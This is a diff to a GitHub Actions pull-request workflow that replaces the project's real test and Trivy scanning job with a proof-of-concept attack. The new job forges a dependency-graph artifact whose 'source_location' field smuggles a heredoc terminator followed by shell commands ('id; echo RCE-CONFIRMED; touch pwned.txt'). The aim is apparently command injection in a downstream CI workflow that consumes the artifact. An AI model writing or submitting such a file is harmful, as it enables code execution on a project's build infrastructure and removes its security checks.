@@ -1,20 +1,45 @@
-# PR workflow.
 name: PR Workflow
 
 on:
   pull_request:
-    branches: [development, release-*]
+    branches: [development]
 
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number }}
-  cancel-in-progress: true
+permissions:
+  contents: read
+  actions: write
 
 jobs:
-  run_tests:
-    uses: epam/ai-dial-ci/.github/workflows/java_pr.yml@4.13.2
-    secrets: inherit
-    with:
-      platforms: "linux/amd64,linux/arm64"
-      java-version: 25
-      trivy-severity: "CRITICAL,HIGH,MEDIUM,LOW"
-      trivy-severity-for-sarif: "CRITICAL,HIGH,MEDIUM,LOW"
+  dependency-graph:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build dependency graph snapshot
+        run: |
+          mkdir -p dependency-graph-reports
+          cat > dependency-graph-reports/dep.json <<JSON
+          {
+            "version": 0,
+            "sha": "${{ github.event.pull_request.head.sha }}",
+            "ref": "refs/pull/${{ github.event.pull_request.number }}/head",
+            "job": {"correlator": "poc", "id": "poc"},
+            "detector": {"name": "poc", "version": "1.0.0", "url": "https://example.com"},
+            "manifests": {
+              "poc": {
+                "name": "poc",
+                "file": {"source_location": "poc\nEOF\nid; echo RCE-CONFIRMED; touch pwned.txt; exit 0"},
+                "resolved": {
+                  "pkg:maven/com.example/poc@1.0.0": {
+                    "package_url": "pkg:maven/com.example/poc@1.0.0",
+                    "relationship": "direct",
+                    "scope": "runtime",
+                    "dependencies": []
+                  }
+                }
+              }
+            },
+            "scanned": "2026-11-11T21:05:00Z"
+          }
+          JSON
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc
+          path: dependency-graph-reports
